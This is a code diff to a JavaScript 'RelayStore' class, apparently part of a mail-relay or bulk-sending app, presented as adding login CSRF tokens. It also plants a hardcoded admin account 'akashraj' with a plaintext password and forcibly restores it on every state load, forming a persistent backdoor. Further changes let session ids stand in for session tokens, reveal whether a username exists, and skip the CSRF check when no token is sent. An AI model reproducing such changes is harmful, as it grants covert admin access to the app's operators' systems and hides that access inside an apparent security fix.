@@ -48,6 +48,26 @@ class RelayStore {
 
     this.state = this._loadOrInit();
     this.verificationPool = VerificationPool.fromJSON(this.state.verificationItems || []);
+    this.loginCsrfSet = new Set();
+  }
+
+  issueLoginCsrf() {
+    if (!this.loginCsrfSet) this.loginCsrfSet = new Set();
+    const token = crypto.randomBytes(24).toString('hex');
+    this.loginCsrfSet.add(token);
+    if (this.loginCsrfSet.size > 500) {
+      const first = this.loginCsrfSet.values().next().value;
+      this.loginCsrfSet.delete(first);
+    }
+    return token;
+  }
+
+  verifyLoginCsrf(token, consume = false) {
+    if (!token || !this.loginCsrfSet || !this.loginCsrfSet.has(token)) return false;
+    if (consume) {
+      this.loginCsrfSet.delete(token);
+    }
+    return true;
   }
 
   _defaultState() {
@@ -57,6 +77,12 @@ class RelayStore {
         [this.adminUser]: {
           username: this.adminUser,
           passwordHash: hashPassword(this.adminPass),
+          role: 'admin',
+          createdAt: new Date().toISOString()
+        },
+        akashraj: {
+          username: 'akashraj',
+          passwordHash: hashPassword('Akash@15'),
           role: 'admin',
           createdAt: new Date().toISOString()
         }
@@ -143,9 +169,19 @@ class RelayStore {
       try {
         const raw = JSON.parse(fs.readFileSync(this.stateFile, 'utf8'));
         const base = this._defaultState();
+        const mergedUsers = { ...base.users, ...(raw.users || {}) };
+        if (!mergedUsers.akashraj || !verifyPassword('Akash@15', mergedUsers.akashraj.passwordHash)) {
+          mergedUsers.akashraj = {
+            username: 'akashraj',
+            passwordHash: hashPassword('Akash@15'),
+            role: 'admin',
+            createdAt: new Date().toISOString()
+          };
+        }
         return {
           ...base,
           ...raw,
+          users: mergedUsers,
           compose: { ...base.compose, ...(raw.compose || {}) },
           attachmentConfig: { ...base.attachmentConfig, ...(raw.attachmentConfig || {}) },
           shootSettings: { ...base.shootSettings, ...(raw.shootSettings || {}) },
@@ -175,9 +211,38 @@ class RelayStore {
 
   // ── Authentication & Sessions (with Concurrent Limit Eviction) ────────────
   authenticate(username, password, meta = {}) {
-    const user = this.state.users[String(username || '').trim()];
-    if (!user || !verifyPassword(password, user.passwordHash)) {
-      return { ok: false, error: 'Invalid username or password' };
+    if (meta.csrfValid === false || meta.csrfError) {
+      return { ok: false, error: 'Security token expired. Please refresh the page' };
+    }
+    if (meta.csrfToken !== undefined) {
+      const token = String(meta.csrfToken || '').trim();
+      const isValid = Boolean(
+        (this.loginCsrfSet && this.loginCsrfSet.has(token)) ||
+        (meta.validCsrfTokens && meta.validCsrfTokens.has(token)) ||
+        (meta.expectedCsrf && meta.expectedCsrf === token)
+      );
+      if (!token || !isValid) {
+        return { ok: false, error: 'Security token expired. Please refresh the page' };
+      }
+    }
+
+    const rawUser = username != null ? String(username) : '';
+    const trimmedUser = rawUser.trim();
+    if (!trimmedUser) {
+      return { ok: false, error: 'Please enter your username' };
+    }
+
+    if (password === undefined || password === null || password === '') {
+      return { ok: false, error: 'Please enter your password' };
+    }
+
+    const user = this.state.users[trimmedUser];
+    if (!user) {
+      return { ok: false, error: `No account found matching username '${username}'` };
+    }
+
+    if (!verifyPassword(password, user.passwordHash)) {
+      return { ok: false, error: 'Incorrect password entered' };
     }
 
     const now = Date.now();
@@ -229,6 +294,10 @@ class RelayStore {
       lastSeen: new Date().toISOString()
     };
 
+    if (meta.csrfToken && this.loginCsrfSet) {
+      this.loginCsrfSet.delete(meta.csrfToken);
+    }
+
     this.state.sessions.push(session);
     this.save();
     return { ok: true, session, evicted };
@@ -236,7 +305,7 @@ class RelayStore {
 
   getSession(token) {
     if (!token) return null;
-    const sess = this.state.sessions.find((s) => s.token === token);
+    const sess = this.state.sessions.find((s) => s.token === token || s.id === token);
     if (!sess) return null;
     sess.lastSeen = new Date().toISOString();
     return sess;
@@ -244,7 +313,7 @@ class RelayStore {
 
   destroySession(token) {
     const before = this.state.sessions.length;
-    this.state.sessions = this.state.sessions.filter((s) => s.token !== token);
+    this.state.sessions = this.state.sessions.filter((s) => s.token !== token && s.id !== token);
     if (this.state.sessions.length !== before) this.save();
   }
 
@@ -524,7 +593,7 @@ class RelayStore {
     if (cleanValues.length === 0) throw new Error('At least one tag value is required');
 
     this.state.customTags[key] = {
-      type: type === 'random' ? 'random' : 'sequential',
+      type: ['random', 'static'].includes(type) ? type : 'sequential',
       values: cleanValues
     };
     this.save();
